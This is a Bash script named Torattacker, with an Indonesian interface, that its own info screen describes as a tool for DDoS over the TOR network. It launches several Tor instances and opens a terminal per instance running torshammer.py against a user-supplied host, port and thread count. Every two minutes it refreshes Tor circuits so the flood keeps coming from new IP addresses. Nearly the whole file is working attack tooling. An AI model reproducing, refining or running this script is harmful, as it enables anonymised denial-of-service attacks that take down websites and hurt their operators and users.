#!/usr/bin/bash
# Torattacker
# Coded by Nedi Senja
# Github: https://github.com/stepbystepexe/Torattacker
trap 'echo;stop;exit 1;' 2
checkroot(){
if [[ "$(id -u)" -ne 0 ]]; then
   printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mMohon, jalankan program root!\n\n\e[0m"
   exit 1
fi
}
clearscreen(){
    clear
    reset
    sleep 1
}
dependencies(){
    command -v bash > /dev/null 2>&1 || { echo >&2 "Sepertinya paket Bash belum terinstall. Jalankan ./install.sh. sekarang."; exit 1; }
    command -v curl > /dev/null 2>&1 || { echo >&2 "Sepertinya paket cURL belum terinstall. Jalankan ./install.sh. sekarang."; exit 1; }
    command -v wget > /dev/null 2>&1 || { echo >&2 "Sepertinya paket Wget belum terinstall. Jalankan ./install.sh. sekarang."; exit 1; }
    command -v openssl > /dev/null 2>&1 || { echo >&2 "Sepertinya paket Openssl belum terinstall. Jalankan ./install.sh. sekarang."; exit 1; }
    command -v tor > /dev/null 2>&1 || { echo >&2 "Sepertinya paket TOR belum terinstall. Jalankan ./install.sh. sekarang."; exit 1; }
    command -v python2 > /dev/null 2>&1 || { echo >&2 "Sepertinya paket Python2 belum terinstall. Jalankan ./install.sh. sekarang."; exit 1; }
    command -v git > /dev/null 2>&1 || { echo >&2 "Sepertinya paket Git belum terinstall. Jalankan ./install.sh. sekarang."; exit 1; }
    if [ $(ls /dev/urandom >/dev/null; echo $?) == "1" ]; then
        echo "/dev/urandom tidak ditemukan!"
    exit 1
fi
}
load(){
    echo -e "\n"
    bar=" >>>>>>>>>>>>>>>>>>> "
    barlength=${#bar}
    i=0
    while((i<100)); do
        n=$((i*barlength / 100))
        printf "\r\e[0m[\e[1;32m%-${barlength}s\e[0m]\e[00m" "${bar:0:n}"
        printf "  \e[1;77mLOADING...!\e[0m "
        ((i += RANDOM%5+2))
        sleep 0.2
    done
}
changeip(){
    killall -HUP tor
}
banner() {
    echo
    printf "\e[1;35m ▄▄▄▄▄▄▄▄     \e[1;92m█▀\e[0m\n"
    printf "\e[1;35m ▀▀▀██▀▀▀   ▄████▄    ██▄████ \e[0m\e[1;77m  ░░░░░░░░░░░░░░░░░░░░░░░░░\e[0m\n"
    printf "\e[1;35m    ██     ██▀\e[1;37\e[0m██\e[1;95m▀██   ██▀     \e[0m\e[1;77m  ░░░\e[1;91m█▀█\e[0m\e[1;77m░\e[1;91m▀█▀\e[0m\e[1;77m░\e[1;91m█▀█\e[0m\e[1;77m░\e[1;91m█▀▀\e[0m\e[1;77m░\e[1;91m█\e[0m\e[1;77m░\e[1;91m█\e[0m\e[1;77m░░░\e[0m\n"
    printf "\e[1;35m    ██     ██\e[1;37\e[0m████\e[1;95m██   ██      \e[0m\e[1;77m  ░░░\e[1;91m█▀█\e[0m\e[1;77m░░\e[1;91m█\e[0m\e[1;77m░░\e[1;91m█▀█\e[0m\e[1;77m░\e[1;91m█\e[0m\e[1;77m░░░\e[1;91m█▀▄\e[0m\e[1;77m░░░\e[0m\n"
    printf "\e[1;35m    ██     ▀██▄▄██▀   ██      \e[0m\e[1;77m  ░░░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░░\e[1;91m▀\e[0m\e[1;77m░░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀▀▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░\e[1;91m▀\e[0m\e[1;77m░░░\e[0m\n"
    printf "\e[1;35m    ▀▀       ▀▀▀▀     ▀▀      \e[0m\e[1;77m  ░░░░░░░░░░░░░░░░░░░░░░░░░\e[0m\n"
    echo
    printf "\e[0;100;77;1m[         Torattacker, My Github: @stepbystepexe         ]\e[0m\n"
}
config(){
    clearscreen
    banner
    printf "\n\e[0m[ \033[32mINFO \e[0m] \033[3mNyalakan koneksi jaringan TOR sebelum menggunakan\e[0m\n\n\n"
    default_portt="80"
    default_threads="600"
    default_tor="y"
        read -p $'\e[0m[\e[41;77;1m Hoastname \e[0m] ' target
            read -p $'\e[0m[\e[42;90;1m   Ports   \e[0m] ' portt
            portt="${portt:-${default_portt}}"
                read -p $'\e[0m[\e[43;90;1m  Threads  \e[0m] ' threads
                threads="${threads:-${default_threads}}"
                    read -p $'\e[0m[\e[44;77;1m  Command  \e[0m] ' inst
                    inst="${inst:-${default_inst}}"
                        read -e -p $'\e[0m[\e[45;77;1m    TOR    \e[0m] ' tor
                            printf "\e[0m"
                            tor="${tor:-${default_tor}}"
        if [[ $tor == "y" || $tor == "Y" ]]; then
        readinst
        printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mTekan ctrl-c untuk menyetop\n"
        attacktor
    else
        attack
        fi
}
readinst(){
    default_inst="3"
    read -p $'\e[0m[\e[46;90;1m  Instant  \e[0m] ' inst
        inst="${inst:-${default_inst}}"
        multitor
}
attacktor(){
    while true; do
        let ii=1
        while [ $ii -le $inst ]; do
            porttor=$((9050+$ii))
            gnome-terminal -- torsocks -P $porttor python torshammer/torshammer.py -t $target -p $portt -r $threads
            ii=$((ii+1))
        done
        sleep 120
        changeip
        let i=1
        let porttor=$((9050+$i))
    done
}
attack(){
    default_inst="4"
        read -p $'\e[0m[\e[44;77;1m  Command  \e[0m] ' inst
            inst="${inst:-${default_inst}}"
            printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mTekan ctrl-c untuk menyetop\n"
            i=1
        while true; do
            let i=1
            while [[ $i -le $inst ]]; do
                gnome-terminal -- python torshammer/torshammer.py -t $target -p $portt -r $threads
                i=$((i+1))
            done
            sleep 120
            killall python
        done
}
checktor(){
    echo
    let i=1
    checkcount=0
        while [[ $i -le $inst ]]; do
            port=$((9050+$i))
            printf "\e[0mMengecek Tor koneksi dari port:\e[77;1m %s\e[77;1m..." $port
            check=$(curl --socks5-hostname localhost:$port -s https://www.google.com > /dev/null; echo $?)
            if [[ "$check" -gt 0 ]]; then
                printf "\e[77;1mGagal!\n"
            else
                printf "\e[77;1mOK!\n"
                let checkcount++
            fi
            i=$((i+1))
        done

    if [[ $checkcount != $inst ]]; then
        echo
        printf "\e[0m[\e[1;96;2m1\e[0m] \e[1;77mMulai ulang semua Tor!\n"
        printf "\e[0m[\e[1;96;2m2\e[0m] \e[1;77mCek Kembali\n"
        printf "\e[0m[\e[1;96;2m3\e[0m] \e[1;77mMulai ulang\n"
        printf "\e[0m[\e[1;96;2m0\e[0m] \e[1;77mKeluar\n"
        echo
        read -p $'\e[0m[\e[1;95m/\e[0m] \e[1;77mMasukan opsi: \e[0m' fail
            if [[ $fail == '1' ]]; then
            checktor
                elif [[ $fail == '2' ]]; then
                stop
                multitor
                    elif [[ $fail == '3' ]]; then
                    clear
                    clearscreen
                    banner
                    menu
                        elif [[ $fail == '0' ]]; then
                        echo
                        printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mKeluar dari program!\n"
                        echo
                        exit 1
            else
            echo
            printf "\e[0m[=\e[1;41;77m Pilihan Salah \e[0m=]"
            echo
            sleep 1
            clear
            banner
            config
        fi
    fi
}
multitor(){
    echo
    printf "\e[0m[\e[31m●\e[0m] \e[77;1mSedang memproses ...\033[0m"
    sleep 3
    echo
    echo
    if [[ ! -d multitor ]]; then
        mkdir multitor;
    fi
    default_ins="1"
    inst="${inst:-${default_inst}}"
    let i=1
        while [[ $i -le $inst ]]; do
            port=$((9050+$i))
            printf "SOCKS Port %s\nData Directory /var/lib/tor%s" $port $i > multitor/multitor$i.
            printf "\e[0mMemulai Tor dari Port:\e[77;1m 905%s\e[77;1m\n" $i.
            tor -f multitor/multitor$i > /dev/null &
            sleep 10
            i=$((i+1))
    done
checktor
}
stop(){
    killall -2 tor > /dev/null 2>&1
    echo
    printf "\e[0m[\e[1;91m!\e[0m] \e[1;77mSemua Koneksi Tor disetop.\e[0m\n"
    echo
}
menu(){
    echo
    printf "\033[0m[\033[1;96;2m1\033[0m] \033[1;77mMulai Torattacker\n"
    echo
    printf "\033[0m[\033[93;1m&\033[0m] LISENSI\n"
    printf "\033[0m[\033[94;1m#\033[0m] Informasi\n"
    printf "\033[0m[\033[92;1m*\033[0m] Perbarui\n"
    printf "\033[0m[\033[91;1m-\033[0m] Keluar\n"
    echo
        read -p $'\e[0m(\e[105;77;1m/\e[0m) \e[1;77mMasukan opsi: \e[0m' option
            if [[ $option == '1' ]]; then
            printf "\n\e[0m[\e[32m●\e[0m] \e[77;1mSedang memproses ...\e[0m\n"
            sleep 1
            config
                elif [[ $option == '2' || $option == '&' ]]; then
                echo
                nano LICENSE
                echo
                clearscreen
                banner
                menu
                    elif [[ $option == '3' || $option == '#' ]]; then
                    echo
                    informasi
                    echo
                        elif [[ $option == '4' || $option == '*' ]]; then
                        echo
                        git pull origin master
                        echo
                        read -p $'\e[0m[\e[32m Tekan Enter \e[0m]'
                        clearscreen
                        banner
                        menu
                            elif [[ $option == '5' || $option == '-' ]]; then
                            echo
                            printf "\e[0m[\e[1;91m!\e[0m] \e[0;1;77mKeluar dari program!\n\e[0m"
                            echo
                            exit 1
            else
                echo
                printf "\e[0m[=\e[1;41;77m Pilihan Salah \e[0m=]"
                echo
                sleep 1
                clearscreen
                banner
                menu
        fi
}
informasi(){
clear
printf "\e[0;100;77;1m[         Tor Attacker, My Github: @stepbyatepexe        ]\e[0m\n"
toilet -f smslant 'Tor'
printf "
Nama        : Torattacker
Versi       : 4.5 (Update: 23 Februari 2020, 9:30 AM)
Tanggal     : 12 Agustus 2019
Author      : Nedi Senja
Tujuan      : Ddos nenggunakan jaringan TOR
              atau jaringan bawang
Terimakasih : Allah SWT.
              FR13NDS, & seluruh
              manusia seplanet bumi
NB          : Manusia gax ada yang sempurna
              sama kaya tool ini.
              Silahkan laporkan kritik atau saran
              Ke - Email: d_q16x@outlook.co.id
                 - WhatsApp: +62 8577-5433-901

[ \e[4mGunakan tool ini dengan bijak \e[0m]\n"
sleep 1
read -p $'\n\n\e[0m[ Tekan Enter ]' opt
    if [[ $opt = '' ]]; then
        clearscreen
        banner
        menu
    fi
}
#checkroot
#checktor
#dependencies
    clearscreen
    banner
    menu
